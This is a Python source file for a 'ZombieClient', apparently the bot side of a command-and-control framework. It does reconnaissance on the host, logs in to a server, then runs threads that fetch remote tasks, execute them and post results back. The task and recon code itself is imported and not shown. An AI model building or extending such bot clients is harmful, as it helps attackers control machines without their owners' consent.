#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

import threading

from time import sleep


from app.components import token, config, logger, machine, task_manager


class ZombieClient:
    def __init__(self):
        logger.log('zombie is waking up...', 'INFO')
        pass

    def do_startup_tasks(self):
        # startup tasks are executed one time after succesful login
        return machine.startup_tasks()

    def keep_logged_in(self):
        token.keep_logged_in()

    def get_new_tasks(self):
        task_manager.get_new_tasks()

    def keep_doing_new_tasks(self):
        task_manager.keep_doing_new_tasks()

    def post_completed_tasks(self):
        task_manager.post_completed_tasks()


    def run(self):

        machine.autorecon()

        if config.autosetup():
            while not token.login():
                sleep(config.read_setting('inet_unreach_retry'))

            while not self.do_startup_tasks():
                sleep(config.read_setting('inet_unreach_retry'))

            threads=[]

            thread_keep_logged_in = threading.Thread(name='keep_logged_in', target=self.keep_logged_in)#, args=((zombie,)))
            threads.append(thread_keep_logged_in)

            thread_get_new_tasks = threading.Thread(name='get_new_tasks', target=self.get_new_tasks)#, args=((zombie,)))
            threads.append(thread_get_new_tasks)

            thread_keep_doing_new_tasks = threading.Thread(name='keep_doing_new_tasks', target=self.keep_doing_new_tasks)#,args=((zombie,)))
            threads.append(thread_keep_doing_new_tasks)

            thread_post_completed_tasks = threading.Thread(name='post_completed_tasks', target=self.post_completed_tasks)#,args=((zombie,)))
            threads.append(thread_post_completed_tasks)

            # Start all threads
            for t in threads:
                # t.setDaemon(True)
                t.start()

            # Wait for all of them to finish
            for t in threads:
                t.join()


